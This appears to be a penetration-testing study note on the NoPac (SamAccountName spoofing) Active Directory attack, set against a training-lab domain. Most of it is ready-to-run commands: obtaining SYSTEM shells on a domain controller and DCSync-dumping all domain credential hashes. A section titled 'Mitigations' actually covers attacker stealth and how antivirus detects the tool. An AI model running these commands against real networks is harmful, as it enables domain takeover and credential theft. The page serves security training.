---
title: NoPac (SamAccountName Spoofing)
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
---
# 🪤 NoPac (SamAccountName Spoofing)

!!! tips "Detailed explanations"
	- [noPac: A Tale of Two Vulnerabilities That Could End in Ransomware](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).
	- [SAM Name impersonation](https://techcommunity.microsoft.com/users/daniel%20naim/164126).

This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.

| 42278                                                                      | 42287                                                                                         |
| -------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
| `42278` is a bypass vulnerability with the Security Account Manager (SAM). | `42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS. |

```bash
# Ensuring Impacket is Installed
git clone https://github.com/SecureAuthCorp/impacket.git

python setup.py install 

# Cloning the NoPac Exploit Repo
git clone https://github.com/Ridter/noPac.git
```

Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. 


```bash
# First we will scan:
sudo python3 scanner.py $domain/$userSamAccounName:$password -dc-ip $domainControllerIP -use-ldap
# Example:
# sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

We will obtain the `ms-DS-MachineAccountQuota` number. If it is set to 0, the attack will not work.

```bash
# Running NoPac & Getting a semi-interactive shell session  using smbexec.py -https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py. This could be "noisy" or may be blocked by AV or EDR.
sudo python3 noPac.py $domain/$user:$password -dc-ip $domainControllerIP -dc-host $hostname -shell --impersonate $userAdmin -use-ldap
# Example: 
# sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

Important: It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run (We can use `ls` to confirm).

```bash
# We could then use the cache file to perform a pass-the-ticket and perform further attacks such as DCSync.  Using noPac to DCSync the Built-in Administrator Account
sudo python3 noPac.py $domain/$user:$password -dc-ip $domainControllerIP -dc-host $hostname --impersonate $userAdmin -use-ldap -dump -just-dc-user $domain/$userAdmin
# Example:
# sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

# We can also dump all
sudo python3 noPac.py $domain/$user:$password -dc-ip $domainControllerIP -dc-host $hostname --impersonate $userAdmin -use-ldap -dump -just-dc
# Example:
# sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc
```

### Mitigations

**If opsec or being "quiet" is a consideration during an assessment, we would most likely want to avoid a tool like smbexec.py.**

If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail. 

The first thing smbexec.py does is create a service called `BTOBTO`. Another service called `BTOBO` is created, and any command we type is sent to the target over SMB inside a .bat file called `execute.bat`. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system. Let's look at a Windows Defender log to see what behavior was considered malicious.